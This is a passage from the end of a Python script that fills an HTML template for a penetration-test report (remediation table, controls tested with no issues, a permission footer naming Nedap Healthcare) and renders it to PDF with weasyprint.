    <tr><th>ID</th><th>Sev</th><th>Title</th><th>Priority</th><th>Effort</th><th>Fix</th></tr>
    {rem_rows_html}
  </table>
</div>

<h1>Controls Tested — No Issues Found</h1>
<div class="section">
  <p style="font-size:8.5pt;color:#9b98b8;margin-bottom:12px;">The following security controls were explicitly tested and found to be functioning correctly.</p>
  <table class="dashboard-table">
    <tr><th>Control</th><th>Result</th></tr>
    {clean_rows_html}
  </table>
</div>

<div class="callout" style="margin-top:24px;text-align:center;font-size:8pt;">
  NullPointer Studio · security research &amp; consulting · 2026-05-06<br>
  <span style="color:#6b6890;">All testing was performed with explicit written permission from Nedap Healthcare.</span>
</div>

</body>
</html>"""

# ─── generate ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("Building HTML...")
    html_content = build_html()
    html_path = BASE_DIR / "report_caren_pentest.html"
    html_path.write_text(html_content, encoding="utf-8")
    print(f"HTML written to {html_path}")

    print("Generating PDF with weasyprint...")
    WeasyprintHTML(string=html_content, base_url=str(BASE_DIR)).write_pdf(str(OUTPUT))
    size_kb = OUTPUT.stat().st_size / 1024
    print(f"PDF written to {OUTPUT}  ({size_kb:.0f} KB)")
